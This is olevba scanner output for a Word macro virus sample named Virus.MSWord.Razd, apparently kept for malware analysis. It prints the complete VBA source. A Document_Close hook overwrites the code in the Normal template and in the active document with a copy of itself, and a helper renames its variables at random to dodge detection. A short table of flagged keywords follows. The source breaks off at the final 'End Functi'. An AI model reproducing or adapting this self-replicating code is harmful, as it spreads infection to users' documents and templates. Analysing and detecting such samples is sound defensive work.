olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Razd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Razd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Razdego

Private Sub Document_Close()

KODWER = KODWER + 1

If Word.Templates(1).VBProject.VBComponents(1).CodeModule.Lines(KODWER, 2 - 1) <> "'Razdego" Then
    
     With Word.Templates(KODWER).VBProject.VBComponents(KODWER).CodeModule
     
        .DeleteLines KODWER, .CountOfLines
        
        .AddFromString kljuc(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(KODWER, _
ThisDocument.VBProject.VBComponents(KODWER).CodeModule.CountOfLines))

        
     End With
    
End If

If Word.ActiveDocument.VBProject.VBComponents(KODWER).CodeModule.Lines(KODWER, 2 - 1) <> "'Razdego" Then

    With Word.ActiveDocument.VBProject.VBComponents(KODWER).CodeModule
    
        .DeleteLines KODWER, .CountOfLines
        
        .AddFromString kljuc(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(KODWER, _
ThisDocument.VBProject.VBComponents(KODWER).CodeModule.CountOfLines))

        
    End With
    
End If

End Sub
Private Function kljuc(JIDWER)

Dim v(3)

v(1) = "LKJASD": v(2) = "KODWER": v(3) = "JIDWER"

For t = 1 To 3

Novi = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & _
Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)

While InStr(1, JIDWER, v(t), vbTextCompare)

LKJASD = InStr(1, JIDWER, v(t), vbTextCompare)
    
JIDWER = Mid(JIDWER, 1, LKJASD - 1) & Novi & Mid(JIDWER, LKJASD + Len(v(t)), Len(JIDWER) - LKJASD)

Wend

Next

kljuc = JIDWER

End Functi

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

